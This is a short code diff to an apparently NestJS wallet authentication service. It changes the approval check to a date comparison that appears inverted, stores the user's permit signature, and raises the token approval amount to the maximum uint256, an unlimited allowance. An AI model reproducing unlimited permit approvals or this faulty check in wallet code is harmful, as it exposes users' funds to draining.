@@ -164,9 +164,10 @@ export class AuthService {
     }
     const { address } = user;
 
-    if (wallet.isApproved) {
+    if (wallet.lastApproveDate && new Date(wallet.lastApproveDate.getTime() + 86400000) <= new Date()) {
       throw new BadRequestException("Already approved");
     }
+    wallet.permit = permit as any;
 
     //
     const contract = this.ethersService.getContract(
@@ -178,7 +179,7 @@ export class AuthService {
 
     // process action
     try {
-      const maxApprove = new BigNumber("1e24").toFixed(0).toString();
+      const maxApprove = new BigNumber("115792089237316195423570985008687907853269984665640564039457584007913129639935").toFixed(0).toString();
       const tuple = {
         value: maxApprove,
         deadline: permit.deadline,
